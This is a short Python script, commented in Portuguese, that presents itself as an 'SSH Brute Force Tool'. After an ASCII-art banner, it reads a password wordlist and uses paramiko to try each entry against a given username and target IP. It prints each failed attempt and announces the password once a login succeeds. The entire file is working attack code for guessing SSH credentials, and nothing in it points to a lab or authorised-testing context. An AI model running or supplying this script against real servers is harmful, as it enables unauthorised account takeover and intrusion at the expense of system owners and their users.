#!/usr/bin/python3
import paramiko
import argparse

BANNER = """
        				          #
				                  &&
        #				          &&(
         @(				          &&%(
          @(/%				    &&@/(
           @@/(#%(    *..&&&&.,....... .  #&&@((#
            &&## ., @@@@@@@@&& ,,..,..  (%%&(#%
              /  @@@&@@@@&@@@@@@@,..... ####%#
               @@@@@&#@@@@&@@@@@@@@@@&(	,
              (@@@@@@%@%@@@@@@@@@@@@@&&##(	 #&/
             ##@@@@@@%@&@@@@@@@@@@@@@&&%#(// &@ /,#
             #&@@@@@@%@#@@@@@@@@@@@@@&&%#(//,@,*/.&
              @@@@@@#@#@@@@@@@@@@@@&&&%#(//&@.*##%
              &@@@@%(@@/%@@@@@@@@&&%#@##(###(/ #(
               ,#, ,(#,##//&.   *((#% /%###(/@//%
               /*& , %a@a// && .,&%@.#%%###(/,/.
             .@@@@@##.@&####@@@@@@@@@@&%(/(##(,
               &%%%#&@@@%%,%.*%@@&%%#&(@/%###(@
                /.* @@@@@@@&#(/((/%   # .%%###
                 @ @@*%% #/#/(##.. ..& %&%%%
                  &@%  (,  (# @%...,@%@&(%
                    .......... .. /@#&#@
                   ,% ,@a@ . &@  %%#/
                  %*,(@&/,. . ,@#%
                    %%##%%%%%%%(
"""
print(BANNER)

parser = argparse.ArgumentParser(description="SSH Brute Force Tool", formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-u", "--user", required=True, help="Usuário para autenticação SSH")
parser.add_argument("-w", "--wordlist", required=True, help="Caminho para a wordlist de senhas")
parser.add_argument("-t", "--target", required=True, help="Endereço IP do alvo")
args = parser.parse_args()

username = args.user
wordlist_path = args.wordlist
target_ip = args.target

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    with open(wordlist_path, "r") as f:
        for palavra in f.readlines():
            senha = palavra.strip()

            try:
                ssh.connect(target_ip, username=username, password=senha)
            except paramiko.ssh_exception.AuthenticationException:
                print(f"[-] TESTANDO COM: {senha} [-]")
            else:
                print(f"[+] SENHA ENCONTRADA ====> {senha} [+]")
                break
except FileNotFoundError:
    print(f"Erro: Wordlist '{wordlist_path}' não encontrada.")
except Exception as e:
    print(f"Ocorreu um erro: {e}")
finally:
    ssh.close()
